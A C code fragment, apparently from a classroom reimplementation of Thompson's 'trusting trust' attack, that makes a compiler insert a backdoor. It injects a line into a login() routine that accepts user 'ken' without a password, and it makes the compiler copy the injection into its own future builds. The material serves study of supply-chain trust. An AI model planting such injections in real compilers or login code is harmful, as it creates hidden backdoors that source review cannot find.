    // match on the start of the login() routine:
    static char login_sig[] = "int login(char *user) {";

    // and inject an attack for "ken":
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    static char compile_sig[] =
                "static void compile(char *program, char *outname) {\n"
                "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
                "    assert(fp);"
                ;
    static char prog_print_line[] = "    fprintf(fp, \"%%s\", program);";

    char* attack = login_attack;
    char* sig = login_sig;
    char* start = strstr(program, sig);
    int add = 0;
    if (!start) {
        attack = prog;
        sig = compile_sig;
        start = strstr(program, sig); 
        add = sizeof(prog_print_line);
    }
    int sig_len = strlen(sig);
    char tmp = start[sig_len];
    start[sig_len] = '\0';
    fprintf(fp, "%s\n", program);
    fprintf(fp, "\t%s", "char prog[] = {\n");
    for (int i = 0; prog[i]; i++)
        fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
    fprintf(fp, "%s", "0 };\n");
    fprintf(fp, "%s\n", attack);
    start[sig_len] = tmp;
    fprintf(fp, "%s\n", start+sig_len+add);